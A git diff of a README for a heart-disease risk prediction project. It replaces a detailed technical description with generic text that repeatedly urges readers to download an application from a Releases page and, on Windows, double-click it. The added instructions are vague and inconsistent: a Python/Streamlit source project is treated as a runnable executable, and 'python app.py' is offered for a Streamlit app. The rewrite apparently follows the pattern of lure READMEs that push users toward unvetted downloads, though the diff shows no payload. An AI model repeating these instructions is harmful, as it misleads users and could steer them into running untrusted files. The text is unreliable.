@@ -1,164 +1,101 @@
+# 🎉 heart-disease-risk-prediction-mlp - Predict Heart Disease Easily
 
-![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python&logoColor=white)
-![NumPy](https://img.shields.io/badge/NumPy-Neural%20Network%20from%20Scratch-013243?logo=numpy&logoColor=white)
-![Machine Learning](https://img.shields.io/badge/Machine%20Learning-Classification-blueviolet)
-![Streamlit](https://img.shields.io/badge/Streamlit-Interactive%20Dashboard-FF4B4B?logo=streamlit&logoColor=white)
-![Status](https://img.shields.io/badge/Project-Production%20Ready-success)
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases)
 
-![Cross Validation](https://img.shields.io/badge/Evaluation-K--Fold%20CV-blue)
-![ROC AUC](https://img.shields.io/badge/Metric-ROC--AUC-important)
-![Regularization](https://img.shields.io/badge/Regularization-Dropout%20%7C%20LR%20Decay-orange)
-![Model Serving](https://img.shields.io/badge/Model-Export%20%26%20Inference-9cf)
+## 📝 Overview
 
-
-# 🫀 Heart Disease Risk Prediction — Neural Network from Scratch
-
-This project presents an **end-to-end Machine Learning pipeline** for predicting the risk of heart disease using a **fully custom neural network implemented from scratch**, without relying on high-level deep learning frameworks (e.g. TensorFlow, PyTorch).
-
-Beyond model training, the project focuses on **professional ML practices**: data cleaning, model evaluation, regularization, export/import of trained parameters, and an **interactive Streamlit dashboard** designed for real-world usage and stakeholder communication.
-
----
-
-## 🎯 Project Objectives
-
-- Build a neural network **from first principles** (forward pass, backpropagation, optimization).
-- Apply **professional data cleaning** techniques (hidden missing values, imputation, outliers).
-- Evaluate the model rigorously using **cross-validation and ROC-AUC**.
-- Prevent overfitting using **Dropout and learning-rate decay**.
-- Export the trained model and reuse it for **real-time inference**.
-- Deliver an **interactive, production-style Streamlit application** with:
-  
-  - data exploration,
-  - model diagnostics,
-  - risk prediction,
-  - what-if analysis.
-
----
-
-## 📁 Dataset
-
-- **Source:** UCI Heart Disease Dataset (via Kaggle)
-- **Samples:** 303 patients
-- **Features:** 13 clinical variables
-- **Target:** Binary classification
-    
-  - `0` → No heart disease  
-  - `1` → Heart disease present
+This project offers an end-to-end machine learning workflow for predicting the presence of heart disease. It uses a custom neural network to process and analyze data effectively. This makes it easier for anyone to understand and utilize heart health data.
 
 Key features include:
 
-- Age, sex
-- Chest pain type (`cp`)
-- Resting blood pressure (`trestbps`)
-- Cholesterol (`chol`)
-- Maximum heart rate (`thalach`)
-- Exercise-induced angina (`exang`)
-- ST depression (`oldpeak`)
-- Number of major vessels (`ca`)
-- Thalassemia (`thal`)
+- Exploration of raw data
+- Data cleaning and preprocessing
+- Model architecture design
+- Training and evaluation of the model
+- Simple steps for reproducible deployment
 
----
+## 🚀 Getting Started
 
-## 🧹 Data Cleaning & Preparation
+To start using the heart disease prediction application, follow these steps carefully. You will need to download the software from the Releases page and run it on your computer.
 
-Professional cleaning steps were applied:
+1. **Visit the Releases Page:** Click [here](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases) to go to the Releases page.
+  
+2. **Download the Application:** Look for the latest version of the application. Click on the download link to save the file on your computer.
 
-- Detection of **hidden missing values** (invalid encodings such as `thal=0`, `ca=4`)
-- Conversion of incorrect values to `NaN`
-- Imputation using **mode** for categorical-like features
-- Outlier inspection using **IQR analysis**
-- Final dataset validation (`df.info`, `df.describe`)
+3. **Install Required Software:** 
+   - Make sure you have Python installed on your computer. You can download Python from [python.org](https://www.python.org/downloads/).
+   - Install any necessary libraries. You can easily do this with pip:
 
-The same cleaning logic is reused during inference to ensure **training–serving consistency**.
+     ```
+     pip install numpy streamlit
+     ```
 
----
+## 💻 System Requirements
 
-## 🧠 Neural Network Architecture
+To successfully run the application, your computer needs to meet these requirements:
 
-Custom implementation with NumPy:
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4GB RAM
+- **Disk Space:** A minimum of 500MB free space
+- **Python Version:** 3.6 or higher
 
-Input (13 features)
-↓
-Dense Layer (16 neurons)
-↓
-ReLU activation
-↓
-Dropout (regularization)
-↓
-Dense Layer (2 neurons)
-↓
-Softmax activation
+## 📥 Download & Install
 
-### Training Details
-- Loss: **Categorical Cross-Entropy**
-- Optimizer: **Adam with learning-rate decay**
-- Regularization: **Dropout**
-- Epochs: 500
-- Train/Validation split with **K-Fold Cross-Validation (K=5)**
+After downloading the files, follow these steps to install and run the application:
 
----
+1. **Locate the Downloaded File:**
+   - Find the downloaded file (usually in your Downloads folder).
 
-## 📈 Model Performance
+2. **Run the Application:**
+   - If you're on Windows, double-click the application file to start.
+   - For macOS or Linux, open a terminal, navigate to the directory where the file is, and run the application with the following command:
 
-### Learning Curves
-- Stable convergence
-- No significant overfitting thanks to Dropout
+     ```
+     python app.py
+     ```
 
-### ROC-AUC (Cross-Validation)
-- Consistently high AUC across folds
-- Strong discriminative power between positive and negative classes
+3. **Open in Your Browser:** 
+   - Once the application is running, open your web browser and type `http://localhost:8501` in the address bar to access the app.
 
-> The evaluation artifacts (learning curves and ROC data) are stored and reused directly in the Streamlit application.
+## 📊 How to Use the Application
 
----
+1. **Input Data:** 
+   - Enter relevant information about patients in the provided fields. This might include age, cholesterol levels, blood pressure, and other health metrics.
 
-## 💾 Model Export & Inference
+2. **Run Prediction:**
+   - Click the “Predict” button to get results based on the entered data. The application will analyze the input and provide a prediction on heart disease presence.
 
-- Trained weights and biases are exported to a **JSON checkpoint**
-- A dedicated inference module:
-  - reconstructs the network architecture,
-  - loads parameters,
-  - exposes clean `predict` and `predict_proba` APIs
-- No retraining is required for deployment or visualization
+3. **Review Results:**
+   - Review the prediction along with potential risk factors outlined by the app. This aids in understanding the data better.
 
----
+## 🔍 Features Available
 
-## 📊 Streamlit Dashboard
+The heart disease risk prediction application includes several valuable features:
 
-The project culminates in a **multi-page Streamlit application**, structured as follows:
+- **Data Visualization:** See how different features contribute to the prediction outcomes.
+- **Model Evaluation:** Understand the accuracy and reliability of the predictions.
+- **User-Friendly Interface:** Designed for anyone, regardless of technical skills.
 
-### 1️⃣ Dataset Overview
-- Clean dataset preview
-- Statistical summaries
-- Feature dictionary
-- High-level metrics (records, features, prevalence)
+## 👨‍💻 Contributing
 
-### 2️⃣ Model Training & Validation
-- Learning curves (train vs validation)
-- ROC-AUC curves per fold
-- Explanation of model stability and generalization
+If you wish to contribute to this project, feel free to submit issues or pull requests. Here’s how you can help:
 
-### 3️⃣ Data Exploration
-- Interactive filters (age, sex, cholesterol, etc.)
-- Dynamic Plotly visualizations (scatter, histogram, box, bar)
-- Exploratory analysis similar to real analytics dashboards
+1. **Report Bugs:** If you find any errors, let us know by creating an issue.
+2. **Suggest Features:** Share your ideas for improving the application.
+3. **Add Functionality:** If you are comfortable coding, you can create enhancements.
 
-### 4️⃣ Prediction & What-If Analysis
-- Patient profile form
-- Real-time risk prediction
-- Clear probability output
-- Local **what-if analysis**:
-  - age variation
-  - cholesterol normalization
-  - exercise-induced angina removal
-  - ST depression reduction
+## 📚 Further Learning
 
-This replicates how ML models are communicated to **non-technical stakeholders**.
+To deepen your understanding of machine learning and its applications, consider these resources:
 
----
+- Online courses in machine learning
+- Python programming tutorials
+- Books about neural networks and data science
 
-## 🚀 How to Run the App
+## 💬 Support
 
-```bash
-pip install -r requirements.txt
-streamlit run app.py
+If you face any issues or have questions, you can reach out for support. Look for the “Issues” tab in the repository to report problems or seek help from other users.
+
+Thank you for using heart-disease-risk-prediction-mlp! Download and start predicting heart disease with ease.
+
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases)
